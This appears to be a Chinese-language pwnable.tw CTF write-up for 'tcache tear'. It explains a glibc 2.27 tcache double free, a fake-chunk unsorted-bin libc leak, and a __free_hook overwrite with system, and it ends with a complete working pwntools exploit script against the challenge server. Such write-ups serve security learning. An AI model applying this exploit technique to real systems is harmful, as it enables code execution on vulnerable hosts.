---

title: pwnable.tw writeup - tcache tear
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

## checksec

```bash
$ checksec tcache_tear
[*] '/home/z1933/workplace/vbshare/ctf/tcache_tear'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    FORTIFY:  Enabled

```


Full RELRO 表示 GOT 表会在程序加载时就填好库函数地址，然后把 GOT 表设置为只读，程序运行时就不能改 GOT 表了。

程序流程还是不难分析的。

##  double free 

Glibc-2.7 ,tcache 没有 double free 检查: [glibc-2.27-malloc](https://elixir.free-electrons.com/glibc/glibc-2.27/source/malloc/malloc.c#L4169)。


下面是  tcache double free 让 malloc 返回任意地址的概述。 关于堆上分配，释放的流程具体可以参考：[Zhang1933/linux-heap-study](https://github.com/Zhang1933/linux-heap-study) 。

**free一次**(假设申请的chunk是32字节的大小):
```
tcache[0]-> chunk0
ptr -> chunk0
```

ptr 为程序中的全局分配释放指针。

**free 第二次:**
```
tcache[0]-> chunk0 ->chunk0
ptr -> chunk0
```

**申请一次**
```
tcache[0]-> chunk0
ptr -> chunk0
```

这个时候我们可以写chunk0的 fd 指针。

```
tcache[0]-> chunk0 -> TARGET_ADDR
ptr -> chunk0
```

然后申请一次，再申请一次 tcache 就会返回我们想要的地址 TARGET_ADDR 进行写操作了。

## 泄露libc

虽然可以任意地址写，但是可写地址并不多。

输入的 name 可写。我们可以在输入的 name 中构造一个 假的chunk。

unsorted bin 是双链循环链表。我们如果可以构造一个 假chunk(大于 tcache bin 的范围即可，这里选(0x500) 释放到unsorted bin ,然后打印 chunk 中的 fd 字段(用 Info 函数)，就可以泄露unsorted bin 的地址了,减去偏移就得到了 libc 的基地址。


在释放进unsorted bin时,构造的假chunk要绕开这些合理性检查：
[glibc-2.27 malloc:4272](https://elixir.free-electrons.com/glibc/glibc-2.27/source/malloc/malloc.c#L4272)

所以还需要在 `name-8+0x500` 的位置构造一个 size 为 `0x20|1` 的假chunk, `name-8+0x500+0x20` 的位置构造 size 为 `0x20|1` 的 假chunk。

name 就是程序一开始输入 name 时的固定地址。

## 控制程序流

得到libc的地址了我们可以得到 `__free_hook` 的地址,然后在指针中写入 system 的地址。下次释放 chunk 中只要数据部分为 `\bin\sh` 就OK了。

## Script

```python
#!/usr/bin/env python3

from pwn import *
from sortedcontainers.sortedlist import add

HOST='chall.pwnable.tw'
PORT=10207
PROC="./tcache_tear"

context.log_level = 'DEBUG'
context.arch = 'amd64'

io=None
elf=ELF(PROC)
lib = ELF("./dynamic64/glibc-2-27/libc-64.so")

if len(sys.argv) == 1 : 
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

def PauseLocalDebug():
    info("process pid: "+str(io.pid))
    pause()

def Info():
    io.sendafter(":","3")

def Malloc(size,data):
    io.sendafter(":","1")
    io.sendafter(":",str(size))
    io.sendafter(":",data)

def Free():
    io.sendafter(":","2")

io.sendafter(":","aaaa")

def writeaddr(addr,val,size):
    # 每调用一次，free两次。注释了毒化tcache[0]的情况
    # 先申请一块
    Malloc(size,"aaaa")
    Free()
    # tcahce[0] -> chunk0
    Free()
    # tcache[0] -> chunk0 -> chunk0
    
    # 再申请一次,此时可以写chunk0的fd
    Malloc(size,pack(addr))
    # tcache[0] -> chunk0 -> addr
    # ptr -> chunk0

    Malloc(size,"aaaa")
    # tcache[0] -> addr
    # ptr -> chunk0

    # 再申请一次,现在可写内容了,写假chunk
    Malloc(size,val)
    # ptr-> fake_chunk


NAME_ADDR=0x602060
PTR_ADDR=0x602088

#  fake chunk 的下一个 chunk 0x20 大小
#  fake chunk  的下下一个chunk 0x20 大小,一块写了,节省次数
fake_chunk=pack(0x20|1)+pack(0)*3+pack(0x20|1) # 全部 set iuse 位为1
writeaddr(NAME_ADDR-8+0x500,fake_chunk,0x50)

# 写 fake chunk ,顺便把全局分配指针改了,节省次数
fake_chunk0=pack(0x500|1)+b'\x00'*40+pack(NAME_ADDR)
writeaddr(NAME_ADDR-8,fake_chunk0,0x60)

# 释放到unsorted bin 中
Free()

# 泄露 unsorted bin 的 fd
Info()
io.recvuntil("Name :")
UNSORTADDR=unpack(io.recvn(6)+b'\x00'*2)
info("UNSORTADDR: "+hex(UNSORTADDR))

# 调试得到的偏移
OFFSET=0x3EBCA0
lib.address=UNSORTADDR-OFFSET
info("libc addr: "+hex(lib.address))
info("system addr: "+hex(lib.symbols['system']))
info("libc __free_hook addr:"+hex(lib.symbols['__free_hook']))

#PauseLocalDebug()

writeaddr(lib.symbols['__free_hook'],pack(lib.symbols['system']),0x70)
# 全局分配指针写入"sh"

Malloc(0x40,'/bin/sh')
Free()

io.interactive()

```

